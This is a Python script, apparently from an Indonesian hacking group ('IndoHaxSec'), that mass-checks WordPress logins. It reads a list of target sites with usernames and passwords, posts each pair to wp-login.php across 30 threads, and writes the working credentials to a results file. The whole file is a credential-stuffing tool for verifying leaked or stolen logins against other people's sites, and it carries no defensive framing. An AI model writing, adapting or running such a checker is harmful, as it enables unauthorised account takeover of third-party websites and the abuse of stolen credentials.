import requests
from bs4 import BeautifulSoup
import os
import concurrent.futures
from urllib.parse import urlparse
import time
import sys
import re
from colorama import init, Fore

# Inisialisasi colorama untuk memastikan dukungan warna di Windows
init()

def efek_mengetik(teks, delay=0.005):
    """Efek mengetik untuk menampilkan teks satu per satu."""
    for char in teks:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print("")

def animasi_pembuka():
    """Menampilkan animasi pembuka dengan teks ASCII berwarna ungu terang dengan efek mengetik."""
    ascii_art = """
\033[95m
╭━━━╮╱╱╭╮╱╱╱╭━╮╭━╮╱╱╭╮╱╱╱╱╭╮
┃╭━━╯╱╱┃┃╱╱╱╰╮╰╯╭╯╱╱┃┃╱╱╱╭╯╰╮
┃╰━━┳┳━╯┣━━━╮╰╮╭╯╭━━┫┃╭━━╋╮╭╯
┃╭━━╋┫╭╮┣━━┃┃╭╯╰╮┃╭╮┃┃┃╭╮┣┫┃
┃┃╱╱┃┃╰╯┃┃━━╋╯╭╮╰┫╰╯┃╰┫╰╯┃┃╰╮
╰╯╱╱╰┻━━┻━━━┻━╯╰━┫╭━┻━┻━━┻┻━╯
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃┃
╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╯
╭╮╭╮╭╮╱╱╱╱╱╭━━━┳╮╱╱╱╱╭╮
┃┃┃┃┃┃╱╱╱╱╱┃╭━╮┃┃╱╱╱╱┃┃
┃┃┃┃┃┣━━╮╱╱┃┃╱╰┫╰━┳━━┫┃╭┳━━┳━╮
┃╰╯╰╯┃╭╮┣━━┫┃╱╭┫╭╮┃┃━┫╰╯┫┃━┫╭╯
╰╮╭╮╭┫╰╯┣━━┫╰━╯┃┃┃┃┃━┫╭╮┫┃━┫┃
╱╰╯╰╯┃╭━╯╱╱╰━━━┻╯╰┻━━┻╯╰┻━━┻╯
╱╱╱╱╱┃┃
╱╱╱╱╱╰╯
\033[0m"""
    efek_mengetik(ascii_art, 0.002)
    time.sleep(0.5)
    efek_mengetik(f"{Fore.RED}𝕀𝕟𝕕𝕠ℍ𝕒𝕩𝕊𝕖𝕔{Fore.RESET}", 0.02)
    time.sleep(0.5)

def test_login_wordpress(url_situs, url_login, username, password):
    """Menguji login ke WordPress."""
    try:
        response = requests.post(url_login, data={
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': url_situs,
            'testcookie': '1'
        }, allow_redirects=True, timeout=5)
        
        if response.status_code != 200:
            return f"{Fore.RED}Gagal login: {url_situs} dengan {username}:{password} (status code: {response.status_code}){Fore.RESET}"
        if "wp-admin" in response.url or "dashboard" in response.text.lower():
            return f"{Fore.GREEN}Sukses login: {url_situs} dengan {username}:{password}{Fore.RESET}"
        else:
            return f"{Fore.RED}Gagal login: {url_situs} dengan {username}:{password}{Fore.RESET}"
    except requests.exceptions.RequestException as e:
        return f"{Fore.YELLOW}Terjadi kesalahan saat menghubungi {url_situs}: {e}{Fore.RESET}"

def process_line(line):
    original = line.strip()
    separators = "#:@|,"
    pattern = rf"([^ {separators}]+)([{separators}])([^ {separators}]+)([{separators}])([^ {separators}]+)"
    match = re.match(pattern, original)
    if not match:
        print(f"{Fore.YELLOW}Format tidak valid: {original}{Fore.RESET}")
        return None

    url_situs = match.group(1)
    username = match.group(3)
    password = match.group(5)
    if not url_situs.startswith("http"):
        url_situs = "http://" + url_situs

    return (original, url_situs, url_situs + "/wp-login.php", username, password)

def main():
    """Fungsi utama."""
    animasi_pembuka()
    
    while True:
        daftar_situs = input(f"{Fore.YELLOW}Masukkan nama file daftar target:{Fore.RESET} ")
        if os.path.exists(daftar_situs):
            break
        print(f"{Fore.RED}File tidak ditemukan, coba lagi.{Fore.RESET}")

    with open(daftar_situs, 'r', encoding='utf-8') as f:
        lines = f.readlines()

    data = [item for line in lines if (item := process_line(line)) is not None]
    
    if not data:
        print(f"{Fore.RED}Tidak ada data valid dalam file input.{Fore.RESET}")
        return

    berhasil_login = []
    future_to_data = {}

    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        for item in data:
            original, url_situs, url_login, username, password = item
            future = executor.submit(test_login_wordpress, url_situs, url_login, username, password)
            future_to_data[future] = item

        for future in concurrent.futures.as_completed(future_to_data):
            result = future.result()
            print(result)
            if f"{Fore.GREEN}Sukses login" in result:
                original, url_situs, url_login, username, password = future_to_data[future]
                berhasil_login.append(original)
                os.makedirs("hasil_scan", exist_ok=True)
                with open("hasil_scan/sukses_logs_wp.txt", 'a') as f:
                    f.write(original + "\n")
                print(f"{Fore.GREEN}Hasil berhasil disimpan di hasil_scan/sukses_logs_wp.txt{Fore.RESET}")

    print(f"{Fore.CYAN}Proses scan selesai.{Fore.RESET}")

if __name__ == "__main__":
    main()
